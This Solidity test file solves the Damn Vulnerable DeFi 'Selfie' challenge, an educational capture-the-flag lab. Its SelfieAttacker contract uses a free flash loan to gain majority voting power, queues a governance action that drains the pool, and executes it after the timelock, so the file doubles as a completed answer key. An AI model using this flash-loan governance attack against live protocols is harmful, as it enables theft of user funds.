// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * =========================================================
     * SOLUTION — test_selfie()
     * =========================================================
     * Attack: Flash loan governance vote
     * 1. Borrow all 1.5M DVT from pool (free, no fee)
     * 2. Self-delegate to register voting power (ERC20Votes)
     * 3. Queue emergencyExit(recovery) — passes >50% vote check
     * 4. Repay flash loan — proposal persists in governance
     * 5. Warp 2 days past governance timelock
     * 6. Execute proposal — pool drained to recovery
     * =========================================================
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieAttacker selfieAttacker = new SelfieAttacker(
            address(pool),
            address(governance),
            address(token),
            recovery
        );
        selfieAttacker.startAttack();
        vm.warp(block.timestamp + 2 days);
        selfieAttacker.executeProposal(); 
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}


/**
 * =========================================================
 * SOLUTION CONTRACT — SelfieAttacker
 * =========================================================
 * Implements IERC3156FlashBorrower to receive the flash loan
 * callback from SelfiePool. The onFlashLoan() function is
 * where the governance manipulation happens — delegate,
 * queue, approve repayment — all within one transaction.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 */
contract SelfieAttacker is IERC3156FlashBorrower {

    address recovery;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    uint actionId;

    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _pool,
        address _governance,
        address _token,
        address _recovery
    ) {
        pool       = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token      = DamnValuableVotes(_token);
        recovery   = _recovery;
    }

    function startAttack() external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
    }

    function onFlashLoan(
        address _initiator,
        address /*_token*/,
        uint256 _amount,
        uint256 _fee,
        bytes calldata /*_data*/
    ) external returns (bytes32) {
        require(msg.sender == address(pool),  "SelfieAttacker: Only pool can call");
        require(_initiator == address(this),  "SelfieAttacker: Initiator is not self");

        // Delegate votes to ourself so we can queue an action
        token.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );
        actionId = _actionId;

        token.approve(address(pool), _amount + _fee);
        return CALLBACK_SUCCESS;
    }

    function executeProposal() external {
        governance.executeAction(actionId);
    }

}
